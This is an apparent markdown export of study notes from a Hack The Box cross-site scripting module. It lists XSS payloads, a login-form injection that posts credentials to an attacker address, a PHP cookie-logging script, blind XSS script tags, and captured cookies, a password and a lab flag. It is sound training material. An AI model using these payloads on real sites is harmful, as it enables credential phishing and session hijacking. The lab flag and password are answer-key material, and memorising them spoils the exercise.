---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "1"
module: "Cross-Site Scripting (XSS)"
output_topics: 19
---

# Cross-Site Scripting (XSS) — XMind Outputs

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

## Outputs

> [!output]+ 🟨 Output 001
> Task 'test' could not be added.
>
> **Source path:** Cross-Site Scripting (XSS) → Reflected XSS → To-Do List app → try adding any test string to see how it's handled: → Task 'test' could not be added.
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4144e167-4d5c-48f2-81e0-c49f6d8787be -->

> [!output]+ 🟨 Output 002
> [!] Testing parameter: password 
> [-] No reflection found 
> [!] Testing parameter: email 
> [!] Reflections found: 1 
> [+] Payload: &lt;HtMl%09onPoIntERENTER+=+confirm()&gt;
>
> **Source path:** Cross-Site Scripting (XSS) → XSS Discovery → Automated Discovery → common open-source tools → https://github.com/s0md3v/XSStrike → cd XSStrike → pip install -r requirements.txt → python xsstrike.py → python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" → [!] Testing parameter: password  [-] No reflection found  [!] Testing parameter: email  [!] Reflections found: 1  [+] Payload: &lt;HtMl%09onPoIntERENTER+=+confirm()&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6fac74c2-3058-4f00-9b9f-d3e17cc67c28 -->

> [!output]+ 🟨 Output 003
> &lt;form id="urlform" role="form" action="index.php" method="GET"&gt;
>
> **Source path:** Cross-Site Scripting (XSS) → Phishing → Login Form Injection → Cleaning Up → find the id of the HTML element we want to remove → Inspector → clicking on the element we need → &lt;form id="urlform" role="form" action="index.php" method="GET"&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a5ee33ff-d5c6-464c-9334-6e2b5397c1b2 -->

> [!output]+ 🟨 Output 004
> GET /?username=test&amp;password=test&amp;submit=Login HTTP/1.1
>
> **Source path:** Cross-Site Scripting (XSS) → Phishing → Login Form Injection → Credential Stealing → listening → netcat → sudo nc -lvnp 80 → but we got the crednetials → GET /?username=test&amp;password=test&amp;submit=Login HTTP/1.1
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ce615377-dfb5-4220-87a1-8fafe6fae61b -->

> [!output]+ 🟨 Output 005
> '&gt;&lt;html/+/ONMoUsEoVEr+=+[8].find(confirm)%0dx//
>
> **Source path:** Cross-Site Scripting (XSS) → Phishing → Login Form Injection → LAB → XSS Discover → run XSSstrike to get the working paylaod → python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" → '&gt;&lt;html/+/ONMoUsEoVEr+=+[8].find(confirm)%0dx//
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ec936f22-bd9c-4440-8f83-039c07359f9e -->

> [!output]+ 🟨 Output 006
> '&gt;&lt;html/+/document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://10.10.14.4:8081&gt;&lt;input type="username" name="username" placeholder="Username"&gt;&lt;input type="password" name="password" placeholder="Password"&gt;&lt;input type="submit" name="submit" value="Login"&gt;&lt;/form&gt; &lt;!--
>
> **Source path:** Cross-Site Scripting (XSS) → Phishing → Login Form Injection → LAB → Deface the web page with the login form and redirect to /phishing/send.php if success → '&gt;&lt;html/+/document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://10.10.14.4:8081&gt;&lt;input type="username" name="username" placeholder="Username"&gt;&lt;input type="password" name="password" placeholder="Password"&gt;&lt;input type="submit" name="submit" value="Login"&gt;&lt;/form&gt; &lt;!--
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 01f0e9bd-7725-4e95-aa9a-5f145200a68b -->

> [!output]+ 🟨 Output 007
> enter URL to send to it
> [     ]
>
> **Source path:** Cross-Site Scripting (XSS) → Phishing → Login Form Injection → LAB → User enter the credentials in the login form → they redirected to send.php → enter URL to send to it [     ]
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6b082563-dd7d-4cce-ac2a-703e2b253b3b -->

> [!output]+ 🟨 Output 008
> URL sent
>
> **Source path:** Cross-Site Scripting (XSS) → Phishing → Login Form Injection → LAB → User enter the credentials in the login form → they redirected to send.php → enter URL to send to it [     ] → send the modified URL with the login → http://10.129.234.166/phishing/index.php?url=%27%3E%3Chtml%2F%2B%2Fdocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.4%3A8081%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E+%3C%21-- → URL sent
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b0e24b11-9f90-4e8b-b730-286123f106c2 -->

> [!output]+ 🟨 Output 009
> Username: admin | Password: p1zd0nt57341myp455
>
> **Source path:** Cross-Site Scripting (XSS) → Phishing → Login Form Injection → LAB → User enter the credentials in the login form → cat creds.txt → Username: admin | Password: p1zd0nt57341myp455
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 742b223a-d6d2-4949-97b0-1c61f1286e1c -->

> [!output]+ 🟨 Output 010
> 10.10.10.10:52798 [200]: /script.js
> 10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
>
> **Source path:** Cross-Site Scripting (XSS) → Session Hijacking → Blind XSS Detection → prepare php file to sort and seperate the cookies (if multiple) → index.php → &lt;?php if (isset($_GET['c'])) {     $list = explode(";", $_GET['c']);     foreach ($list as $key =&gt; $value) {         $cookie = urldecode($value);         $file = fopen("cookies.txt", "a+");         fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");         fclose($file);     } } ?&gt; → wait for the victim to visit the vulnerable page and view our XSS payload → 10.10.10.10:52798 [200]: /script.js 10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7c1e6ca8-8e65-4522-90a9-56fe1ccd87ca -->

> [!output]+ 🟨 Output 011
> Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
>
> **Source path:** Cross-Site Scripting (XSS) → Session Hijacking → Blind XSS Detection → prepare php file to sort and seperate the cookies (if multiple) → index.php → &lt;?php if (isset($_GET['c'])) {     $list = explode(";", $_GET['c']);     foreach ($list as $key =&gt; $value) {         $cookie = urldecode($value);         $file = fopen("cookies.txt", "a+");         fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");         fclose($file);     } } ?&gt; → wait for the victim to visit the vulnerable page and view our XSS payload → cat cookies.txt → Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a6aa1563-6282-4b35-ab02-702aab4bc51a -->

> [!output]+ 🟨 Output 012
> Name = cookie
>
> **Source path:** Cross-Site Scripting (XSS) → Session Hijacking → Blind XSS Detection → Change the Cookie → open Developer tool → Storage → click on the + → Name = cookie
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 70094674-3dd1-4b74-b41b-f01ecf5a831c -->

> [!output]+ 🟨 Output 013
> Value = f904f93c949d19d870911bf8b05fe7b2
>
> **Source path:** Cross-Site Scripting (XSS) → Session Hijacking → Blind XSS Detection → Change the Cookie → open Developer tool → Storage → click on the + → Value = f904f93c949d19d870911bf8b05fe7b2
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d541f52a-de45-43cd-a102-8684d4af04bf -->

> [!output]+ 🟨 Output 014
> [200]: GET /
>
> **Source path:** Cross-Site Scripting (XSS) → Session Hijacking → Blind XSS Detection → LAB → website has registeration form 5 inputs → use many XSS to all of them untill we got Log to our PHP Server → found one → "&gt;&lt;script src=http://10.10.14.4:8080/&gt;&lt;/script&gt; → [200]: GET /
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ca08a051-6022-45e3-88bc-d9994c22261a -->

> [!output]+ 🟨 Output 015
> [200]: GET /img
>
> **Source path:** Cross-Site Scripting (XSS) → Session Hijacking → Blind XSS Detection → LAB → website has registeration form 5 inputs → use many XSS to all of them untill we got Log to our PHP Server → found one → "&gt;&lt;script src=http://10.10.14.4:8080/&gt;&lt;/script&gt; → specify which input field has the vulnerability → "&gt;&lt;script src=http://10.10.14.4:8080/image&gt;&lt;/script&gt; → got Log → [200]: GET /img
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 55db7d0e-1593-4201-9bf3-05b7c2519177 -->

> [!output]+ 🟨 Output 016
> [200]: GET /script2.js
> [200]: GET /index.php?c=cookie=c00k1355h0u1d8353cu23d
>
> **Source path:** Cross-Site Scripting (XSS) → Session Hijacking → Blind XSS Detection → LAB → now send the payload → "&gt;&lt;script src=http://10.10.14.4:8080/script2.js&gt;&lt;/script&gt; → we got the logs → [200]: GET /script2.js [200]: GET /index.php?c=cookie=c00k1355h0u1d8353cu23d
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ae37fcad-fc1b-46a4-84e7-8b7e46b46624 -->

> [!output]+ 🟨 Output 017
> Victim IP: 10.129.234.166 | Cookie: cookie=c00k1355h0u1d8353cu23d
>
> **Source path:** Cross-Site Scripting (XSS) → Session Hijacking → Blind XSS Detection → LAB → now send the payload → "&gt;&lt;script src=http://10.10.14.4:8080/script2.js&gt;&lt;/script&gt; → we got the logs → [200]: GET /script2.js [200]: GET /index.php?c=cookie=c00k1355h0u1d8353cu23d → cat cookies.txt → Victim IP: 10.129.234.166 | Cookie: cookie=c00k1355h0u1d8353cu23d
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 39c1fb83-0f7e-4479-b734-11d45503e272 -->

> [!output]+ 🟨 Output 018
> value = c00k1355h0u1d8353cu23d
>
> **Source path:** Cross-Site Scripting (XSS) → Session Hijacking → Blind XSS Detection → LAB → now send the payload → use cookie editor extension → Add → value = c00k1355h0u1d8353cu23d
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f98be57a-db6c-402f-b417-f15057ce603d -->

> [!output]+ 🟨 Output 019
> GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1762512134;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
>
> **Source path:** Cross-Site Scripting (XSS) → Skills Assessment → Using the Session Hijacking techniques, try to steal the victim's cookies, which should contain the flag → we got in our php server the cookie → GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1762512134;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2329d83b-1a4e-4a7a-add9-66d01747d1ba -->
